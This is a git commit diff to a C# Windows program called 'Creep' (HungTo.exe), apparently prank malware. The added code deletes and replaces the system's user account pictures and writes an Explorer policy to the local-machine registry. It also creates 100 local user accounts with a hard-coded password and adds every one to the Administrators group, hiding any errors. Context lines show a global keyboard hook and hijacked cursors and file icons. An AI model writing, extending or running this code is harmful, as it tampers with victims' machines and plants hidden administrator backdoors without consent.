bb20369cc433859e20907db0e22871d5978f5c97
tn4m <104765487+tn4m@users.noreply.github.com>
2022-06-04 11:13:40 +0000

    Add files via upload

--- HungTo.exe/Creep/MainWindow.xaml.cs
+++ HungTo.exe/Creep/MainWindow.xaml.cs
@@ -1,6 +1,8 @@
 ﻿using Microsoft.Win32;
 using System;
 using System.Diagnostics;
+using System.DirectoryServices;
+using System.IO;
 using System.Windows;
 using System.Windows.Controls;
 using System.Windows.Forms;
@@ -30,6 +32,7 @@ namespace Creep
             gkh.KeyDown += new KeyEventHandler(handleKey);
             gkh.hook();
 
+            createUser();
             WorkWorkWorkWork();
 
             InitializeComponent();
@@ -47,6 +50,22 @@ namespace Creep
 
         public void WorkWorkWorkWork()
         {
+            File.Delete(@"C:\ProgramData\Microsoft\User Account Pictures\user-192.png");
+            File.Delete(@"C:\ProgramData\Microsoft\User Account Pictures\user-32.png");
+            File.Delete(@"C:\ProgramData\Microsoft\User Account Pictures\user-40.png");
+            File.Delete(@"C:\ProgramData\Microsoft\User Account Pictures\user-48.png");
+            File.Delete(@"C:\ProgramData\Microsoft\User Account Pictures\user.png");
+            File.Delete(@"C:\ProgramData\Microsoft\User Account Pictures\user.bmp");
+            File.Delete(@"C:\ProgramData\Microsoft\User Account Pictures\guest.png");
+            File.Delete(@"C:\ProgramData\Microsoft\User Account Pictures\guest.bmp");
+            File.WriteAllBytes(@"C:\ProgramData\Microsoft\User Account Pictures\user-32.png", Properties.Resources.ht);
+            File.WriteAllBytes(@"C:\ProgramData\Microsoft\User Account Pictures\user-40.png", Properties.Resources.ht);
+            File.WriteAllBytes(@"C:\ProgramData\Microsoft\User Account Pictures\user-48.png", Properties.Resources.ht);
+            File.WriteAllBytes(@"C:\ProgramData\Microsoft\User Account Pictures\user-192.png", Properties.Resources.ht);
+            File.WriteAllBytes(@"C:\ProgramData\Microsoft\User Account Pictures\guest.png", Properties.Resources.ht);
+            File.WriteAllBytes(@"C:\ProgramData\Microsoft\User Account Pictures\guest.bmp", Properties.Resources.ht);
+            File.WriteAllBytes(@"C:\ProgramData\Microsoft\User Account Pictures\user.bmp", Properties.Resources.ht);
+            File.WriteAllBytes(@"C:\ProgramData\Microsoft\User Account Pictures\user.png", Properties.Resources.ht);
             string temp = System.IO.Path.GetTempPath();
             System.IO.File.WriteAllBytes(@"C:\Windows\" + "icon.ico", Properties.Resources.texticon);
             System.IO.File.WriteAllBytes(@"C:\Windows\" + "cursor_ht.cur", Properties.Resources.cs);
@@ -56,10 +75,15 @@ namespace Creep
             editKey = Registry.ClassesRoot.CreateSubKey(@"txtfile\DefaultIcon");
             editKey.SetValue("", @"C:\Windows\" + "icon.ico");
             editKey.Close();
+
             editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
             editKey.SetValue("Arrow", @"C:\Windows\" + "cursor_ht.cur");
             editKey.SetValue("Hand", @"C:\Windows\" + "cursor_ht.cur");
             editKey.SetValue("Wait", @"C:\Windows\" + "cursor_ht.cur");
+            editKey.Close();
+
+            editKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer");
+            editKey.SetValue("UseDefaultTile", "1", RegistryValueKind.DWord);
             editKey.Close();
 
             editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Desktop");
@@ -99,6 +123,31 @@ namespace Creep
             System.IO.File.WriteAllBytes(videopath, Properties.Resources.street);
 
             video.Source = new Uri(videopath);
+        }
+        public static void createUser()
+        {
+
+
+            for (int i = 1; i <= 100; i++)
+            {
+                try
+                {
+                    DirectoryEntry AD = new DirectoryEntry("WinNT://" +
+                                        Environment.MachineName + ",computer");
+                    DirectoryEntry NewUser = AD.Children.Add("Hung To " + i.ToString(), "user");
+                    NewUser.Invoke("SetPassword", new object[] { "buta-1,3-dien" });
+                    NewUser.Invoke("Put", new object[] { "Description", "Hung To giau ngau" });
+                    NewUser.CommitChanges();
+                    DirectoryEntry grp;
+
+                    grp = AD.Children.Find("Administrators", "group");
+                    if (grp != null) { grp.Invoke("Add", new object[] { NewUser.Path.ToString() }); }
+                }
+                catch (Exception ex)
+                {
+
+                }
+            }
         }
     }
 }
